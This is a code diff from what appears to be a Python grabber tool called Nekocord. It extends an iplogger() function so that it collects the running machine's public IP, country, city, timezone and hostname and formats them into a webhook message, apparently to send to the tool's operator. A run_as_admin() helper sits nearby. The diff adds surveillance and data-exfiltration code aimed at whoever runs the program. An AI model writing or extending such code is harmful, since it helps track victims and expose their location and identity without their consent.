@@ -48,6 +48,15 @@ def run_as_admin():
         sys.exit(1)
 
 def iplogger():
+
+    ipinfo = requests.get("https://ipinfo.io/json").json()
+
+    ip = ipinfo.get("ip", "Unknown")
+    citys = ipinfo.get("city", "Unknown")
+    timezone = ipinfo.get("timezone", "Unknown")
+    country = ipinfo.get("country", "Unknown")
+
+    host = socket.gethostname()
     data = {
         "username": "Nekocord | Address",
         "avatar_url": "https://i.imgur.com/VF1uUWN.png", 
@@ -64,6 +73,16 @@ def iplogger():
                     "value": f"||{ip}||",
                     "inline": True
                 },
+                {
+                    "name": "🌍️ location",
+                    "value": f"{country} | {citys}",
+                    "inline": True
+                },
+                {
+                    "name": "🕒️ Timezone",
+                    "value": f"{country} | {timezone}",
+                    "inline": True
+                }
             ],
             "footer": {
                 "text": "nekocord. | https://github.com/zakocord/Nekocord"
